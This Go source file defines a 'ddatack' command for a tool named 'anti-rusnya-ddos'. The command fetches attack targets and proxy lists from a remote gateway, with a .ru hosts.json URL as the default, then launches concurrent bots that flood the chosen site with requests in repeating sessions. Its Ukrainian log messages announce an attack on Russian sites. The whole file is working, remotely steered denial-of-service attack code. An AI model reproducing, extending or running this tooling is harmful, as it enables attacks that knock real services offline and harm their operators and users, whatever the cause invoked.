package cmd

import (
	"context"
	"sync"
	"sync/atomic"
	"time"

	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"

	"github.com/meddion/anti-rusnya-ddos/pkg"
)

const (
	GATEWAY_TIMEOUT = time.Second * 10
	SRC_TIMEOUT     = time.Second * 10
)

var (
	ddatackCmd = &cobra.Command{
		Use:   "ddatack",
		Short: "надсилає багато запитів на обрані цілі, цілі оновлюються через API",
		Args:  cobra.MinimumNArgs(0),
		Run:   ddatackRun,
	}
	gateway string
	src     string
)

func init() {
	ddatackCmd.PersistentFlags().StringVar(
		&gateway,
		"gateway",
		"http://rockstarbloggers.ru/hosts.json",
		"адреса, що повертає списки джерела для атаки",
	)
	ddatackCmd.PersistentFlags().StringVar(
		&src,
		"src",
		"",
		"джерело. адреса з якої отримати дані про атаку",
	)
}

func ddatackRun(cmd *cobra.Command, args []string) {
	// Shutdown signal
	done, terminate := CreateDoneChan()
	startOsSignalHandler(terminate)

	epoch := int64(0)
	for {
		atomic.AddInt64(&epoch, 1)

		select {
		case <-done:
			return
		default:
		}

		ctx, termBots := context.WithCancel(context.Background())
		startBotHandler(done, termBots, &epoch, epoch)

		log.Infof("Готуюся до атаки русні :) Сесія: %d \n", epoch)
		log.Infof("Кожні %d запитів ціль і проксі можуть змінюватися.\n", reqPerEpoch)

		if src == "" {
			srcCtx, cancel := context.WithTimeout(ctx, GATEWAY_TIMEOUT)
			var err error
			src, err = pkg.GetSrcURL(srcCtx, gateway)
			cancel()
			if err != nil {
				select {
				case <-ctx.Done():
					if _, ok := ctx.Deadline(); ok {
						log.Infof("Час очікування на джерела закінчився")
						continue
					}
					return
				default:
				}

				log.Infof("Отримуємо списки джерел: %v\n", err)
				continue
			}
		}

		log.Infof("Обране джерело: %s\n (ПЕРЕВІРТЕ ЙОГО ДОСТОВІРНІСТЬ)", src)

		srcCtx, cancel := context.WithTimeout(ctx, SRC_TIMEOUT)
		srcRsp, err := pkg.GetDataFromSrc(srcCtx, src)
		cancel()
		if err != nil {
			select {
			case <-ctx.Done():
				if _, ok := ctx.Deadline(); ok {
					log.Infof("Час очікування від джерела закінчився")
					continue
				}
				return
			default:
			}

			log.Errorf("Не вдалося отримати дані від джерела: %v\n", err)
			continue
		}

		if err := pkg.ValidateTargetData(srcRsp); err != nil {
			log.Errorf("Під час валідації даних про атаку (перевірте джерело): %v", err)
			continue
		}

		log.Infof("Дані із джерела підвантажено. Ціль: %s, К-ість проксі: %d\n",
			srcRsp.Site.URL, len(srcRsp.Proxies))

		var wg sync.WaitGroup
		counter := make(chan bool, botsNum)
		if err := pkg.StartBots(ctx, &wg, srcRsp, maxErrCount, botsNum, counter); err != nil {
			log.Errorf("Не вдалося запустити ботів: %v\n", err)
			continue
		}
		go pkg.RequestLimiter(ctx, termBots, &wg, reqPerEpoch, counter)

		wg.Wait()
	}
}
